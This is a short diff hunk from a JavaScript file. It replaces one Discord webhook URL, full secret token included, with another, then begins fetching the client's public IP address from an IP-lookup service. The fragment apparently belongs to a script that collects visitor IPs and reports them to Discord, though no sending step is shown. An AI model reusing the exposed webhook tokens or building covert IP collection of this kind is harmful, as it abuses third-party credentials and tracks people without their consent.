@@ -1,4 +1,4 @@
-const whurl = 'https://discord.com/api/webhooks/1134836423535628358/q1J5auRTp7K2sd5xX6xV7aWqWj-eW4V74qbf41Yrbq2AWlaGf8MiZ7FUKAbyapqBvTKD';
+const whurl = 'https://discord.com/api/webhooks/1136396363249234011/210ZaTPoSO7Sl0q98jm-4-mP7malsIo1sSgmHncdOT0JDU_FHrNJJOhOVGuy0o17__yr';
 
 let clientIp;
 fetch('https://api.ipify.org?format=json')
